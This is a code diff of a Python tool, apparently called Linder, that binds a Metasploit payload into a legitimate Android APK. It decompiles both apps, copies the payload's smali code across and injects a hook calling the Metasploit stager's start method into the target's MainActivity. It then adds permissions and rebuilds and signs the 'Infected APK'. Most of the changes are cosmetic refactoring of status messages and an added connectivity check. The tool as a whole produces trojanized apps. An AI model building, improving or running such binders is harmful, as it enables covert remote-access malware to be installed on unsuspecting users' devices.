@@ -1,4 +1,4 @@
-import os,sys,subprocess
+import os,sys,subprocess,socket
 from xml.dom.minidom import parseString
 from time import sleep
 
@@ -30,34 +30,50 @@ Termux_Bool = False
 if os.path.exists("/data/data/com.termux/files/home/"):
 	Termux_Bool = True
 
+def err_msg(msg):
+    print(RED + "[!] " + msg + WHITE)
+
+def print_status(msg):
+    print(CYAN + "[+] " + msg + WHITE)
+
+def isOnline():
+    try:
+        # connect to the host
+        socket.create_connection(("www.google.com", 80))
+        return True
+    except OSError:
+        pass
+    return False
+
 def Update():
 	if os.name == 'nt':
 		pass # Will add for windows soon.
 	else:
 		os.system("which curl>>w.txt")
 		if os.path.getsize('w.txt') == 0:
-			print(RED + "curl is not installed, please install it" + WHITE)
+			err_msg("curl is not installed, please install it")
 			os.system(rm + " w.txt")
 			exit()
 		else:
-			print(YELLOW + 'Checking for updates...' + WHITE)
+                        os.system(rm + " w.txt")
+			print_status(YELLOW + 'Checking for updates...')
 			o = open('.ver','r')
 			oo = o.read()
 			o.close()
 			os.system(rm + ' .ver')
-			os.system('curl -LO https://github.com/R37r0-Gh057/Linder/raw/master/.ver')
+			os.system('curl -s -LO https://github.com/R37r0-Gh057/Linder/raw/master/.ver')
 			u = open('.ver','r').read()
 			if int(oo) == int(u):
-				print(YELLOW + 'No updates available' + WHITE)
+				print_status(YELLOW + 'No updates available')
 			else:
-				print(GREEN + "Update available. Updating...(DONT CLOSE!" + WHITE)
+				print_status(GREEN + "Update available. Updating...(DONT CLOSE!")
 				os.system(rm + ' termux-install.sh main.py README.md CONTRIBUTORS.mf')
 				os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/main.py')
 				os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/README.md')
 				os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/CONTRIBUTORS.md')
 				os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/termux-install.sh')
 				os.system('chmod +x *')
-				print(GREEN + "Update Finished" + WHITE)
+				print_status(GREEN + "Update Finished")
 				exit()
 def Usage():
 	print(YELLOW + 'python3 %s <payload.apk> <target.apk> <output.apk> \n' % (str(sys.argv[0])))
@@ -166,7 +182,7 @@ def newsmali(contents,targetstring):
 				f.write('\n')
 				f.write(i)
 				f.write('\n')
-				f.write('    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V')
+				f.write('    invoke-static {}, Lcom/metasploit/stage/Payload;->start()V')
 			else:
 				f.write('\n')
 				f.write(i)
@@ -213,24 +229,24 @@ def Bind():
 		
 		try:
 			if os.path.isdir("TempP"):
-				print(CYAN + "[+] Cleaning Temporary Files..." + WHITE)
+				print_status("Cleaning Temporary Files...")
 				subprocess.call(rm + " TempP",shell=True)
 				if not os.path.isdir("TempP"):
 					os.mkdir("TempP")
-				print (CYAN + "done." + WHITE)
+				print_status("done.")
 			else:
 				os.mkdir("TempP")
 		except:
 			pass
-		print(CYAN + "[+] Copying APKs..." + WHITE)
+		print_status("Copying APKs...")
 		subprocess.call(cp + ' ' +  str(sys.argv[1]) + " TempP", shell=True)
 		subprocess.call(cp + ' ' + str(sys.argv[2]) + " TempP", shell=True)
 
-		print (CYAN + "done." + WHITE)
+		print_status("done.")
 
 	# STEP 2.
 
-		print (CYAN + "[+] Decompiling APKs...\n" + WHITE)
+		print_status("Decompiling APKs...\n")
 		os.chdir("TempP/")
 		if Termux_Bool:
 			os.system('apkmod -d %s %s' % (original,original.replace('.apk','')))
@@ -239,42 +255,42 @@ def Bind():
 			os.system('apktool d -f %s' % (original))
 			os.system('apktool d -f %s' % (payload))
 
-		print (CYAN + "\ndone." + WHITE)
+		print_status("\ndone.")
 	# STEP 3.
 
-		print (CYAN + '[+] Copying payload smali codes to target apk...' + WHITE)
+		print_status('Copying payload smali codes to target apk...')
 		if cp.lower().startswith("xcopy"):
 			subprocess.call(cp + ' /e "%s/smali/"  "%s/smali/"' % (payload.replace('.apk',''), original.replace('.apk','')), shell=True)
 		else:
 			subprocess.call(cp + ' "%s/smali/com/"  "%s/smali/"' % (payload.replace('.apk',''), original.replace('.apk','')), shell=True)
-		print (CYAN + "done." + WHITE)
+		print_status("done.")
 
 	# STEP 4.
 
-		print (CYAN + "[+] Fetching Package Name & MainActivity smali location" + WHITE)
+		print_status("Fetching Package Name & MainActivity smali location")
 		package_name_path, package_name = SetP(findP('%s/AndroidManifest.xml' % (original.replace('.apk',''))))
 		smalitarget = SetA(findA("%s/AndroidManifest.xml" % (original.replace('.apk',''))))
 		smali_name = smalitarget.split('.')[len(smalitarget.split('.')) - 1]
 		smali_loc = smalitarget.replace('.','/')
 		if not os.path.isfile("%s/smali/%s.smali" % (original.replace('.apk',''),smali_loc)): # Will be fixed in the next update
-			print (YELLOW + "\n\nIt looks like this app is somewhat protected. \nThe MainActivity smali file which is specified in the AndroidManifest.xml (%s) is not present. This will be fixed in the next update\n CANNOT CONTINUE. EXITING..." % (smali_loc) + WHITE )
+			err_msg(YELLOW + "\n\nIt looks like this app is somewhat protected. \nThe MainActivity smali file which is specified in the AndroidManifest.xml (%s) is not present. This will be fixed in the next update\n CANNOT CONTINUE. EXITING..." % (smali_loc))
 			subprocess.call(rm + 'TempP')
 			exit()
 		else:
 			smali_name = smali_loc.split('/')[len(smali_loc.split('/')) - 1]
-			print (CYAN + "\nMainActivity Smali location:- " + GREEN + '%s' %(str(smali_loc)))
-			print (CYAN + 'Package Name:- ' + GREEN + '%s' % (str(package_name)))
+			print_status("\nMainActivity Smali location:- " + GREEN + '%s' %(str(smali_loc)))
+			print_status('Package Name:- ' + GREEN + '%s' % (str(package_name)))
 			print ("\n")
 
 	# STEP 5.
-		print (CYAN + "[+] Injecting Hook")
+		print_status("Injecting Hook")
 		con,trgstr,lineno = find(original.replace('.apk','')+'/smali/'+smali_loc+'.smali','null' )
 		newsmali(con,trgstr)
 		subprocess.call(mv + ' newsmali %s/smali/%s.smali' % (original.replace('.apk',''), smali_loc),shell=True)
 
 	# STEP 6.
 
-		print (CYAN + "[+] Writing Permissions,Features,etc." + WHITE)
+		print_status ("Writing Permissions,Features,etc.")
 		tar_man='%s/AndroidManifest.xml' % (original.replace('.apk',''))
 		with open(tar_man,'r') as f:
 			con = f.read()
@@ -310,11 +326,11 @@ def Bind():
 					f1.write('\n')
 			f1.close()
 		
-		print (CYAN + 'done.' + WHITE)
+		print_status('done.')
 
 	# STEP 6.
 
-		print (CYAN + '[+] Compiling Infected APK...\n' + WHITE)
+		print_status('Compiling Infected APK...\n')
 
 		if Termux_Bool:
 			subprocess.call("apkmod -r %s fin_out.apk" % (original.replace('.apk','')),shell=True)
@@ -323,7 +339,7 @@ def Bind():
 			subprocess.call("apktool b %s -o %s -f" % (original.replace('.apk',''),str(sys.argv[3])),shell=True)
 			subprocess.call(mv + ' '+ str(sys.argv[3]) + ' ..',shell=True)
 			os.chdir('../')
-		print(CYAN + '[+] Signing Infected APK...\n' + WHITE)
+		print_status('Signing Infected APK...\n')
 		if Termux_Bool:
 			subprocess.call("apkmod -s TempP/fin_out.apk %s" % (str(sys.argv[3])),shell=True)
 			print ( GREEN + "\nInfected app saved :  " + YELLOW + " %s (%s bytes)" % (str(sys.argv[3]),str(os.path.getsize(str(sys.argv[3])))) + WHITE)	
@@ -336,11 +352,11 @@ def Bind():
 		exit()
 	except (UnicodeDecodeError) as e:
 		subprocess.call(rm + ' TempP',shell=True)
-		print(RED + "Looks like APKTool has failed to decompile properly. Exiting..." + WHITE)
+		err_msg("Looks like APKTool has failed to decompile properly. Exiting...")
 		exit()
 	except Exception as e:
 		subprocess.call(rm + ' TempP',shell=True)
-		print(RED + "ERROR OCCURED! EXITING..." + WHITE)
+		err_msg("ERROR OCCURED! EXITING...")
 		print('\n' + str(e))
 		exit()
 
@@ -352,10 +368,10 @@ def main():
 		which = 'where'
 	else:
 		which = 'which'
-	print("Checking whether APKTOOL is installed or not...")
+	print_status("Checking whether APKTOOL is installed or not...")
 	os.system(which + " apktool>>ap.txt")
 	if os.path.getsize('ap.txt') == 0:
-		print(RED + "\nERROR: " + WHITE + "APKTOOL is not installed or not in path. Exiting.")
+		err_msg("ERROR: " + WHITE + "APKTOOL is not installed or not in path. Exiting.")
 		os.system(rm + " ap.txt")
 		exit()
 	else:
@@ -364,20 +380,22 @@ def main():
 	if Termux_Bool:
 		os.system("which apkmod>>apk.txt")
 		if os.path.getsize('apk.txt') == 0:
-			print(RED + "ERROR: " + WHITE + "Please run " + GREEN + "termux-setup.sh" + WHITE + " to install dependencies.")
+                        os.system("rm apk.txt")
+			err_msg("ERROR: " + WHITE + "Please run " + GREEN + "termux-setup.sh" + WHITE + " to install dependencies.")
 			exit()
 		else:
+                        os.system("rm apk.txt")
 			argscheck()
-	print("Checking whether APKSIGNER is installed or not...")
+	print_status("Checking whether APKSIGNER is installed or not...")
 	os.system(which + " apksigner>>aps.txt")
 	if os.path.getsize('aps.txt') == 0:
-		print(RED + "\nERROR: " + WHITE + "APKSIGNER is not installed or not in path. Exiting")
+		err_msg("\nERROR: " + WHITE + "APKSIGNER is not installed or not in path. Exiting")
 		os.system(rm + " aps.txt")
 		exit()
 	else:
 		print(GREEN + "INSTALLED" + WHITE)
 		os.system(rm + " aps.txt")
-	print(YELLOW + "\nALL OK, Checking args...\n\n" + WHITE)
+	print_status(YELLOW + "ALL OK, Checking args...\n\n")
 	argscheck()
 
 
@@ -389,15 +407,19 @@ def argscheck():
 		if os.path.isfile(str(sys.argv[1])) and os.path.isfile(str(sys.argv[2])):
 			Bind()
 		else:
-			print (RED + '\nAPK(s) specified are not found!' + WHITE)
+			err_msg('APK(s) specified are not found!')
 			exit()
 	elif len(sys.argv) == 2:
 		if str(sys.argv[1]) == '--update':
-			Update()
+                        if isOnline():
+                            Update()
+                        else:
+                            err_msg("Please turn ON your data connection")
+                            exit()
 		else:
 			Usage()
 	else:
-		print (RED + "Not enough arguments passed. See help:-\n" + WHITE)
+		err_msg("Not enough arguments passed. See help:-\n")
 		Usage()
 
 
@@ -412,7 +434,7 @@ sleep(1)
 # Finally:-
 
 if not os.path.isfile("release.keystore"):
-	print(RED + "\nERROR: keystore file not found. EXITING..." + WHITE)
+	err_msg("\nERROR: keystore file not found. EXITING...")
 	exit()
 else:
 	main()
